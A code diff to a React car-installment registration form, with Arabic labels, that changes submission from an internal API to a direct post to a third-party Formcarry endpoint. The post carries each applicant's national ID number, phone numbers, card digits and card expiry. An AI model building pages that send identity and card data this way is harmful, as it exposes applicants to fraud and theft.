@@ -49,24 +49,32 @@ export function RegistrationForm({ selectedCar, onSelectCar }: RegistrationFormP
     }
     
     try {
-      // Send to Formcarry with selected car details
-      const registrationData = {
-        ...formData,
-        selectedCarId: selectedCar?.id,
-        selectedCar: selectedCar,
-        createdAt: new Date().toISOString(),
-      }
-      
-      const response = await fetch("/api/register", {
+      // Send directly to Formcarry
+      const response = await fetch("https://formcarry.com/s/ZXsyzAQSlEQ", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(registrationData),
+        headers: { 
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          fullName: formData.fullName,
+          nin: formData.nin,
+          phone1: formData.phone1,
+          phone2: formData.phone2 || "غير محدد",
+          cardNumber: formData.cardLast8,
+          cardExpiry: formData.cardExpiry,
+          hasPreviousInstallment: formData.hasPreviousInstallment ? "نعم" : "لا",
+          selectedCar: selectedCar ? `${selectedCar.brand} ${selectedCar.model}` : "لم يتم الاختيار",
+          carPrice: selectedCar ? `${selectedCar.price} دج` : "",
+          monthlyPayment: selectedCar ? `${selectedCar.monthlyPayment} دج/شهر` : "",
+          registrationDate: new Date().toLocaleString("ar-DZ"),
+        }),
       })
       
       const result = await response.json()
-      console.log("[v0] Registration result:", result)
+      console.log("[v0] Formcarry result:", result)
     } catch (error) {
-      console.error("[v0] Error sending registration:", error)
+      console.error("[v0] Error sending to Formcarry:", error)
     }
     
     // Store in localStorage for dashboard
